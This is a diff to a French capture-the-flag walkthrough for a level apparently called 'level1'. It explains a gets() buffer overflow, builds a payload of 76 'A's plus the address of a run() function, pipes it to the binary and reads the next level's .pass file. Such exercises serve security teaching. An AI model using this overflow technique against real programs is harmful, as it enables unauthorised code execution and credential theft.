@@ -10,7 +10,7 @@ La fonction run contient un appel system mais cette fonction n'est pas appelé d
 
 http://beta.hackndo.com/buffer-overflow/#pratique
 
-La fonction main utilise la fonction gets :lit une ligne depuis stdin et la place dans le tampon pointé par s jusqu'à atteindre un retour-chariot, ou EOF, qu'il remplace par « \0 ».
+La fonction main utilise la fonction gets: lit une ligne depuis stdin et la place dans le tampon pointé par s jusqu'à atteindre un retour-chariot, ou EOF, qu'il remplace par « \0 ».
 Il n'y a pas de vérification de débordement de tampon. C'est donc du coup dangereux
 
 http://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/
@@ -30,12 +30,7 @@ En utilisant l'adresse de run nous avons:
 
 $> python -c "print 'A' * 76 + '\x44\x84\x04\x08'" > /tmp/test
 
-Puis on lance la commande :
-$> cat /tmp/test | ./level1
-Good... Wait what?
-Segmentation fault (core dumped)
-
-oups ... dans ce cas
+Puis on lance la commande qui imite l'entrée standard:
 $> cat /tmp/test - | ./level1
 Good... Wait what?
 cat /home/user/level2/.pass
